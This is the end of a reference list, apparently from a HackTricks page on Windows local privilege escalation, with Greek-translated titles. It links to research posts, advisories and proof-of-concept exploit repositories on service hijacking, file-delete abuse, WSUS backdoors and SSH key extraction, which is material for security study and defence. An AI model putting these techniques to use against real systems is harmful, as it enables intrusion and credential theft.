- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own με Microslop: Συνδυασμός συνθηκών ανταγωνισμού CLDFLT και πυρήνα DirectX για τοπική κλιμάκωση προνομίων στα Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Ένας I/O Ring για να τους κυβερνά όλους: Πλήρης primitive εκμετάλλευσης ανάγνωσης/εγγραφής στα Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Κατάχρηση αυθαίρετων διαγραφών αρχείων για κλιμάκωση προνομίων και άλλα χρήσιμα κόλπα](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Κώδικας exploit για FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Επιθέσεις WSUS, Μέρος 2: CVE-2020-1013, ένα 1-Day τοπικής κλιμάκωσης προνομίων στα Windows 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Εξερεύνηση του Credential Manager και του Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - PoC για το CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Περιορισμένη ανάθεση Kerberos βάσει πόρων: Όταν μια αλλαγή εικόνας οδηγεί σε κλιμάκωση προνομίων](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Εξαγωγή ιδιωτικών κλειδιών SSH από τον SSH Agent των Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Μετατρέποντας εταιρικούς διακομιστές ενημερώσεων σε εργοστάσια backdoor (0_o) – Μέρος 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Μετατρέποντας εταιρικούς διακομιστές ενημερώσεων σε εργοστάσια backdoor (0_o) – Μέρος 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Κλιμάκωση προνομίων μέσω διαγραφής φακέλου του Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: Αναδρομή στα βήματά σας μέχρι το NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group - Συμβουλευτικό δελτίο κλιμάκωσης προνομίων μέσω offsets κοινόχρηστης μνήμης του Windows MIDI Services](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
